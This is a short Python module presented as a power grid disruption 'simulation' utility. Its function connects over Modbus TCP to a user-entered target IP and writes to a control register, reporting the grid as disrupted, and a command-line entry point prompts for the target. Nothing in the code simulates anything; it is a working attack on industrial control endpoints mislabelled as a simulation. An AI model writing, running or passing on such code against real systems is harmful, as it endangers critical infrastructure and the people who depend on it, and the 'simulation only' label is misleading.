"""Power grid disruption simulation utilities."""

from __future__ import annotations

from typing import Optional

from .modbus_utils import ModbusTcpClient


def disrupt_power_grid(target: str, port: int = 502) -> Optional[bool]:
    """Attempt to disrupt a power grid endpoint (simulation only)."""
    client = ModbusTcpClient(target, port=port)
    try:
        client.connect()
        client.write_register(0, 1)
        print(f"Disrupted power grid at {target}")
        return True
    except Exception as exc:  # pragma: no cover - defensive logging path
        print(f"Error: {exc}")
        return None
    finally:
        client.close()


def main() -> None:
    """CLI entry point for manual testing."""
    target = input("Enter target IP: ")
    disrupt_power_grid(target)


if __name__ == "__main__":
    main()
